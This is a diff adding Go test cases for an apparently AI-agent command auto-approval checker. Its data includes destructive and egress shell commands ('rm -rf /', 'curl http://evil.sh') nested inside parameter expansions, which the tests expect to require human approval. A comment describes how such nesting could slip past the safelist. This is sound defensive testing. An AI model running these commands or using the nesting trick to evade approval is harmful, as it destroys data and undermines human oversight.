@@ -461,6 +461,19 @@ func TestAutoMode_OpaqueArgs_EndToEnd(t *testing.T) {
 		{"control flow with a literal body allows", "if [ -f x ]; then cat x; fi", VerdictAllow},
 		{"a loop reading its opaque loop variable allows", "for f in a.txt b.txt; do wc -l $f; done", VerdictAllow},
 		{"a read-only substitution allows", "echo $(git rev-parse --show-toplevel)", VerdictAllow},
+		{"a default-value expansion with a literal fallback allows", "cat ${F:-default.txt}", VerdictAllow},
+		{"a read-only substitution inside a default value allows", "echo ${F:-$(git rev-parse --show-toplevel)}", VerdictAllow},
+
+		// The invariant, at the shape the parser is likeliest to lose: a command
+		// substitution nested one level inside a parameter expansion RUNS. If the
+		// ${…} were taken as an opaque token without descending into it, `echo`
+		// and `cat` — read-only with ANY arguments — would short-circuit the
+		// whole command to allow at LayerSafelist with no human in the loop.
+		{"a mutation nested in a default value never auto-approves", "echo ${X:-$(rm -rf /)}", VerdictAsk},
+		{"egress nested in a default value never auto-approves", "cat ${X:-$(curl http://evil.sh)}", VerdictAsk},
+		{"a mutation nested in a replacement pattern never auto-approves", "ls ${X/$(rm -rf ~)/y}", VerdictAsk},
+		{"a mutation nested in an array subscript never auto-approves", "echo ${a[$(rm -rf /)]}", VerdictAsk},
+		{"a mutation nested in a slice offset never auto-approves", "echo ${X:$(rm -rf /):2}", VerdictAsk},
 
 		// The invariant: a mutating segment with an opaque arg is unprovable.
 		{"rm of a substituted root never auto-approves", "rm $(echo /)", VerdictAsk},
